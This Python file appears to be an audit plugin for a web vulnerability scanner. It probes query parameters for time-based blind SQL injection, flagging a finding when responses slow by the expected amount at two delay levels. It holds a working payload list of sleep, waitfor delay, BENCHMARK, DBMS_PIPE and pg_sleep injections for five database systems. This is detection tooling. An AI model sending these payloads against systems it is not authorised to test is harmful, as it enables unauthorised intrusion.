#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from twebscaner.libs import severity
from twebscaner.libs.base_handler import *
from twebscaner.libs.config import PLUGIN_TYPE
from twebscaner.libs.fuzzer import checkpoint
from twebscaner.libs.fuzzer.fuzzer import createMutants
from twebscaner.libs.sql_tools import dbms
from twebscaner.libs.url_parse import URL
from twebscaner.libs.vulns import Vuln

logger = logging.getLogger('plugins')


class ExactDelay(object):
    """
    A simple representation of a delay string like "sleep(%s)"
    """

    def __init__(self, delay_fmt, dbms, delta=0, mult=1):
        """
        :param delay_fmt: The format that should be use to generate the delay
                          string. Example: "sleep(%s)".
        """
        self._delay_fmt = delay_fmt
        self._delay_delta = delta
        self._delay_multiplier = mult
        self._dbms = dbms

    def get_string_for_delay(self, seconds):
        """
        Applies :param seconds to self._delay_fmt
        d = ExactDelay('sleep(%s)')
        d.get_string_for_delay(3)
        'sleep(3)'
        """
        res = ((seconds * self._delay_multiplier) + self._delay_delta)
        return self._delay_fmt % res

    def set_delay_delta(self, delta):
        """
        Some commands are strange... if you want to delay for 5 seconds you
        need to set the value to 6; or 4... This value is added to the seconds:
        d = ExactDelay('sleep(%s)')
        d.get_string_for_delay(3)
        'sleep(3)'
        d.set_delay_delta(1)
        d.get_string_for_delay(3)
        'sleep(4)'
        """
        self._delay_delta = delta

    def set_multiplier(self, mult):
        """
        Some delays are expressed in milliseconds, so we need to take that into
        account and let the user define a specific delay with 1000 as multiplier
        d = ExactDelay('sleep(%s)', mult=1000)
        d.get_string_for_delay(3)
        'sleep(3000)'
        """
        self._delay_multiplier = mult

    def __repr__(self):
        return u'<ExactDelay (fmt:%s, delta:%s, mult:%s)>' % (self._delay_fmt,
                                                              self._delay_delta,
                                                              self._delay_multiplier)


class blindsql_time(BasePlugin):
    DELAYS = [
        # Access
        ExactDelay("1 or sleep(%s)", dbms.ACCESS),
        ExactDelay("1' or sleep(%s)", dbms.ACCESS),
        ExactDelay('1" or sleep(%s)', dbms.ACCESS),

        # MSSQL
        ExactDelay("1;waitfor delay '0:0:%s'--", dbms.MSSQL),
        ExactDelay("1);waitfor delay '0:0:%s'--", dbms.MSSQL),
        ExactDelay("1));waitfor delay '0:0:%s'--", dbms.MSSQL),
        ExactDelay("1';waitfor delay '0:0:%s'--", dbms.MSSQL),
        ExactDelay("1');waitfor delay '0:0:%s'--", dbms.MSSQL),
        ExactDelay("1'));waitfor delay '0:0:%s'--", dbms.MSSQL),

        # MySQL 5
        ExactDelay("1 or BENCHMARK(%s,MD5(1))", dbms.MYSQL, mult=500000),
        ExactDelay("1' or BENCHMARK(%s,MD5(1)) or '1'='1", dbms.MYSQL, mult=500000),
        ExactDelay('1" or BENCHMARK(%s,MD5(1)) or "1"="1', dbms.MYSQL, mult=500000),

        ExactDelay("1 AND (SELECT * FROM (SELECT(SLEEP(%s)))A)", dbms.MYSQL),
        ExactDelay("1 OR (SELECT * FROM (SELECT(SLEEP(%s)))A)", dbms.MYSQL),

        # Single and double quote string concat
        ExactDelay("'+(SELECT * FROM (SELECT(SLEEP(%s)))A)+'", dbms.MYSQL),
        ExactDelay('"+(SELECT * FROM (SELECT(SLEEP(%s)))A)+"', dbms.MYSQL),

        # These are required, they don't cover the same case than the previous
        # ones (string concat).
        ExactDelay("' AND (SELECT * FROM (SELECT(SLEEP(%s)))A) AND '1'='1", dbms.MYSQL),
        ExactDelay('" AND (SELECT * FROM (SELECT(SLEEP(%s)))A) AND "1"="1', dbms.MYSQL),
        ExactDelay("' OR (SELECT * FROM (SELECT(SLEEP(%s)))A) OR '1'='2", dbms.MYSQL),
        ExactDelay('" OR (SELECT * FROM (SELECT(SLEEP(%s)))A) OR "1"="2', dbms.MYSQL),

        # Oracle
        ExactDelay('1 AND 2822=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(82)||CHR(90)||CHR(77),%s)', dbms.ORACLE),
        ExactDelay("1' AND 2822=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(82)||CHR(90)||CHR(77),%s)", dbms.ORACLE),
        ExactDelay('1" AND 2822=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(82)||CHR(90)||CHR(77),%s)', dbms.ORACLE),

        # PostgreSQL
        ExactDelay("1 or pg_sleep(%s)", dbms.POSTGRE),
        ExactDelay("1' or pg_sleep(%s) and '1'='1", dbms.POSTGRE),
        ExactDelay('1" or pg_sleep(%s) and "1"="1', dbms.POSTGRE),

    ]

    def __init__(self, options={}):
        BasePlugin.__init__(self, PLUGIN_TYPE.AUDIT_PLUGIN)

        self.wait_time = 5
        self.second_wait_time = 10

    def audit(self, response, task):
        original_wait_time = response.time

        qs = checkpoint.getQs(task)
        if qs:
            for delay_object in self.DELAYS:
                delay_first = delay_object.get_string_for_delay(self.wait_time)
                delay_second = delay_object.get_string_for_delay(self.second_wait_time)

                mutants = createMutants(qs, [delay_first], False)
                for mutant in mutants:
                    checkpoint.sendMutant(self, task, mutant, self.analyze_first_result, args={'mutant': mutant,
                                                                                               'delay_second': delay_second,
                                                                                               'original_wait_time': original_wait_time})

    @catch_status_code_error
    def analyze_first_result(self, response, task):
        original_wait_time = response.save.get('args', {}).get('original_wait_time')
        mutant = response.save.get('args', {}).get('mutant')
        delay_second = response.save.get('args', {}).get('delay_second')

        if response.time > (original_wait_time + self.wait_time - 1) and \
                response.time < (original_wait_time + self.wait_time + 1):
            mutant.setModValue(delay_second)

            checkpoint.sendMutant(self, task, mutant, self.analyze_second_result,
                                  args={'original_wait_time': original_wait_time})

    @catch_status_code_error
    def analyze_second_result(self, response, task):
        original_wait_time = response.save.get('args', {}).get('original_wait_time')

        if response.time > (original_wait_time + self.second_wait_time - 1) and \
                response.time < (original_wait_time + self.second_wait_time + 1):
            description = 'SQL盲注'
            vul = Vuln.from_task(URL(task['url']).getFullDomain(), 'SQL盲注', description, severity.URGENT, 0,
                                 self.get_name(), task)
            self.submit_vuln(vul)